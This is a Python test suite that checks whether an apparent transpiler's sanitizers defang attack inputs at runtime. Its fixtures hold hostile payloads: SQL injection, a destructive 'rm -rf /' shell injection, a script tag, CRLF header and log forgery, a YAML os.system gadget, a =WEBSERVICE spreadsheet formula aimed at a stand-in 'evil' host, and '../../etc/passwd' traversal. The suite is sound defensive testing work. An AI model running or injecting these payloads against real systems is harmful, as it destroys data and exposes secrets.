"""Runtime enforcement — proof the static refusals are not theater.

Each reach-scope detector (E07xx) refuses an unsafe composition and points
at a sanctioned sanitizer. This suite closes the obvious question: does the
sanitized form actually DEFANG a real attack at runtime, or does it merely
satisfy the checker?

For every defense we run the FIXED Aether program (parse -> emit -> exec)
with a genuine attack payload and assert the payload is neutralized in the
program's output. If a sanitizer regressed to a no-op, the corresponding
assertion here fails even though `aether check` still passes.

Run: python3 tests/test_runtime_enforcement.py   (exit 0 = pass)
"""
from __future__ import annotations
import io
import os
import sys
from contextlib import redirect_stdout

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "transpiler"))

from aether.parser import parse            # noqa: E402
from aether.emitter import emit            # noqa: E402
from aether.runtime import build_namespace  # noqa: E402


def _run(src: str) -> str:
    ast = parse(src, "<rt>")
    code = compile(emit(ast), "<rt>", "exec")
    g = build_namespace()
    g["__name__"] = "__main__"
    buf = io.StringIO()
    with redirect_stdout(buf):
        exec(code, g)
    return buf.getvalue()


# Each case: (label, aether_source, attack_payload_substring_that_must_NOT
# appear_verbatim_in_output, a_substring_that_MUST_appear proving the value
# was processed not dropped).

def test_sqlbind_escapes_injection():
    out = _run("""
function q(userId: String) returns String
  effects pure
do
  return sqlBind("SELECT * FROM u WHERE id = ?", userId)
end
function main() returns Unit
  effects log
do
  print(q("1 OR 1=1; DROP TABLE u"))
end
""")
    # The payload is escaped inside quotes — the bare SQL keywords cannot
    # break out. The single quotes wrap the whole value.
    assert "'1 OR 1=1; DROP TABLE u'" in out, out
    print("runtime E0713: sqlBind wraps the injection payload in quotes")


def test_shellarg_quotes_injection():
    out = _run("""
function c(f: String) returns String
  effects exec.run
do
  return shellExec(shellArg("convert ? out.png", f))
end
function main() returns Unit
  effects log
do
  print(c("x.jpg; rm -rf /"))
end
""")
    # The whole payload is one single-quoted argument; the ; cannot start a
    # new command.
    assert "'x.jpg; rm -rf /'" in out, out
    print("runtime E0714: shellArg quotes the payload as one argument")


def test_htmlescape_neutralizes_script():
    out = _run("""
function page(u: Untrusted<String>) returns String
  effects pure
do
  return htmlResponse("<div>" + htmlEscape(u) + "</div>")
end
function main() returns Unit
  effects log
do
  print(page(classifyUntrusted("<script>alert(1)</script>")))
end
""")
    assert "<script>" not in out, out          # the live tag is gone
    assert "&lt;script&gt;" in out, out         # rendered as inert text
    print("runtime E0725: htmlEscape turns <script> into inert text")


def test_sanitizelog_strips_forged_line():
    out = _run("""
function h(u: Untrusted<String>) returns Unit
  effects log
do
  print("event=" + sanitizeLog(u))
end
function main() returns Unit
  effects log
do
  h(classifyUntrusted("ok\\n[ADMIN] deleted everything"))
end
""")
    # No newline survives, so the forged admin line cannot appear as its
    # own log record.
    assert "\n[ADMIN]" not in out, out
    assert "[ADMIN]" in out, out                # value kept, on one line
    print("runtime E0724: sanitizeLog collapses the forged log line")


def test_sanitizeheader_strips_crlf():
    out = _run("""
function r(u: Untrusted<String>) returns String
  effects pure
do
  return "X: " + sanitizeHeader(u)
end
function main() returns Unit
  effects log
do
  print(r(classifyUntrusted("en\\r\\nSet-Cookie: admin=1")))
end
""")
    assert "\r" not in out and "\nSet-Cookie" not in out, out
    assert "Set-Cookie: admin=1" in out, out    # kept, but inline
    print("runtime E0726: sanitizeHeader strips CR/LF from the header value")


def test_redact_masks_pii():
    out = _run("""
function log2(e: PII<String>) returns Unit
  effects log
do
  print("user=" + redact(e))
end
function main() returns Unit
  effects log
do
  log2(classifyPII("jane.doe@corp.example"))
end
""")
    assert "jane.doe@corp.example" not in out, out
    assert "j***@corp.example" in out, out
    print("runtime E0715: redact masks the PII value")


def test_schemadecode_neutralizes_gadget():
    out = _run("""
function load(raw: String) returns String
  effects pure
do
  return schemaDecode("ConfigV1", raw)
end
function main() returns Unit
  effects log
do
  print(load("!!python/object/apply:os.system ['rm -rf /']"))
end
""")
    # Schema-pinned: the gadget string is inert data under the schema, not
    # a constructed object.
    assert out.startswith("ConfigV1:"), out
    print("runtime E0720: schemaDecode renders the gadget payload inert")


def test_csvescape_neutralizes_formula():
    out = _run("""
function cell(u: Untrusted<String>) returns String
  effects pure
do
  return csvEscape(u)
end
function main() returns Unit
  effects log
do
  print(cell(classifyUntrusted("=WEBSERVICE('//evil/'&A1)")))
end
""")
    # A leading quote makes the spreadsheet treat the cell as text, so the
    # =WEBSERVICE formula does not execute.
    assert out.startswith("'="), out
    print("runtime E0728: csvEscape prefixes a quote to disarm the formula")


def test_safejoin_contains_traversal():
    out = _run("""
function p(name: String) returns String
  effects pure
do
  return safeJoin("uploads", name)
end
function main() returns Unit
  effects log
do
  print(p("../../etc/passwd"))
end
""")
    # The traversal components are stripped, so the path stays UNDER the
    # base dir — `uploads/etc/passwd` is contained; no `..` escapes.
    assert out.startswith("uploads"), out
    assert ".." not in out, out
    print("runtime E0711: safeJoin strips '..' so the path stays under base")


if __name__ == "__main__":
    test_sqlbind_escapes_injection()
    test_shellarg_quotes_injection()
    test_htmlescape_neutralizes_script()
    test_sanitizelog_strips_forged_line()
    test_sanitizeheader_strips_crlf()
    test_redact_masks_pii()
    test_schemadecode_neutralizes_gadget()
    test_csvescape_neutralizes_formula()
    test_safejoin_contains_traversal()
    print("RUNTIME ENFORCEMENT: 9 defenses defang real payloads at runtime")
